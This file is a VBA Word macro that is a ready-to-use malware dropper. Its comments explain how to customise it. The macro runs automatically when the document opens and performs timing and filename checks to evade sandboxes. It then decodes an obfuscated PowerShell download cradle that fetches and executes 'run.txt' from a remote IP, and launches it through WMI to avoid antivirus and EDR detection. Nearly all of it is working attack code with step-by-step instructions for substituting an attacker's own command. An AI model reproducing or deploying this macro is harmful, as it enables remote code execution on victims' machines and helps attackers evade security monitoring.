' ============================================================
' Obfuscated Word Macro — WMI PS Download Cradle
' ============================================================
' WHAT THIS DOES:
'   Uses WMI Win32_Process.Create() to run PowerShell with a
'   base64-encoded download cradle. The string contents are
'   obfuscated using a rotation cipher to avoid static analysis.
'
' WHY WMI INSTEAD OF Shell.Run():
'   - Shell.Run() is heavily monitored by AV and EDR
'   - WMI process creation is less commonly hooked
'   - The process appears to come from WMI Service, not Word
'   - This makes attribution/detection harder
'
' THE OBFUSCATION (Yellow/Grass/Screen/Gorgon functions):
'   - Yellow(): decodes an obfuscated string
'   - Grass(): subtracts 12 from the char code (rotation cipher)
'   - Screen(): takes the first 3 characters (3-digit char code groups)
'   - Gorgon(): removes the first 3 characters
'
'   To encode: take each character's ASCII code, add 12, concatenate
'   Example: "pow" → "112" + "123" + "131" → "112123131"
'   Decode: take 3-digit groups → subtract 12 from each → back to char
'
' HOW TO CUSTOMIZE:
'   1. Create your PS command (download cradle to your Kali IP)
'   2. Encode it: for each char: ord(c) + 12, as 3-digit groups
'      Python: ''.join(str(ord(c)+12).zfill(3) for c in "your command")
'   3. Replace the Apples string with your encoded command
'   4. Embed in .docm as above
'
' SANDBOX EVASION:
'   - Sleep check: waits 5s and verifies real time passed
'   - Document name check: verifies doc is named 'app.docm'
'     (sandboxes often use generic names like 'sample.docm')
' ============================================================

' Sleep API for timing-based sandbox evasion
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' -------------------------------------------------------
' Auto-execution hooks
' -------------------------------------------------------
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

' -------------------------------------------------------
' Decoding functions (rotation cipher)
' -------------------------------------------------------

' Grass: Decode a single 3-digit char group by subtracting 12
' Input: "109" → Chr(109 - 12) = Chr(97) = 'a'
Function Grass(Goats)
    Grass = Chr(Goats - 12)
End Function

' Screen: Take the first 3 characters (one encoded char)
Function Screen(Grapes)
    Screen = Left(Grapes, 3)
End Function

' Gorgon: Remove the first 3 characters (consume processed chunk)
Function Gorgon(Topside)
    Gorgon = Right(Topside, Len(Topside) - 3)
End Function

' Yellow: Full decode loop — processes the encoded string 3 chars at a time
' Works like: while string not empty, decode next 3-char group, append, advance
Function Yellow(Troop)
    Do
        Shazam = Shazam + Grass(Screen(Troop))  ' decode next char
        Troop = Gorgon(Troop)                    ' advance to next 3-char group
    Loop While Len(Troop) > 0
    Yellow = Shazam
End Function

' -------------------------------------------------------
' Main payload
' -------------------------------------------------------
Function MyMacro()
    Dim Apples As String  ' encoded PowerShell command
    Dim Leap As String    ' decoded PowerShell command
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    ' -------------------------------------------------------
    ' SANDBOX EVASION: Timing check
    ' -------------------------------------------------------
    ' Sandboxes often accelerate or skip Sleep() calls.
    ' We sleep 5 seconds and verify that approximately 5 real seconds passed.
    ' If time < 4.5s, we're in a sandbox → exit without running payload.
    t1 = Now()
    Sleep (5000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 4.5 Then
        Exit Function
    End If

    ' -------------------------------------------------------
    ' SANDBOX EVASION: Document name check
    ' -------------------------------------------------------
    ' Many sandboxes open files with generic names.
    ' We verify the document is named "app.docm" (our expected name).
    ' Yellow("109124124058112123111121") decodes to "app.docm"
    ' Encoded: a=109, p=124, p=124, .=58(46+12), d=112, o=123, c=111, m=121
    If ActiveDocument.Name <> Yellow("109124124058112123111121") Then
        Exit Function
    End If

    ' -------------------------------------------------------
    ' PAYLOAD: Encoded PowerShell command
    ' -------------------------------------------------------
    ' The Apples string is our encoded command.
    ' Yellow() decodes it using the rotation cipher.
    '
    ' Original decoded command (example):
    '   "powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.49.67/run.txt')"
    '
    ' To encode your own command:
    '   python3 -c "cmd='YOUR_COMMAND'; print(''.join(str(ord(c)+12).zfill(3) for c in cmd))"
    '
    ' CHANGE: Update this string with your encoded command and IP
    Apples = "124123131113126127116113120120044057113132113111044110133124109127127044057122123124044057131044116117112112113122044057111044117113132052122113131057123110118113111128044122113128058131113110111120117113122128053058112123131122120123109112127128126117122115052051116128128124070059059061069062058061066068058064069058066066059109128128109111116058128132128051053"
    Leap = Yellow(Apples)

    ' -------------------------------------------------------
    ' EXECUTION VIA WMI
    ' -------------------------------------------------------
    ' Instead of Shell.Run(), we use WMI Win32_Process.Create().
    ' This spawns the process as a child of WMI Service Host, not Word.
    '
    ' Yellow("131117122121115121128127070") decodes to "winmgmts:"
    ' Yellow("099117122063062107092126123111113127127") decodes to "Win32_Process"
    '
    ' GetObject("winmgmts:") → connects to WMI
    ' .Get("Win32_Process")  → gets the Win32_Process WMI class
    ' .Create Leap, ...      → calls the Create method with our decoded PS command
    '
    ' Tea, Coffee, Napkin → output parameters we don't need (process ID, etc.)
    GetObject(Yellow("131117122121115121128127070")).Get(Yellow("099117122063062107092126123111113127127")).Create Leap, Tea, Coffee, Napkin
End Function
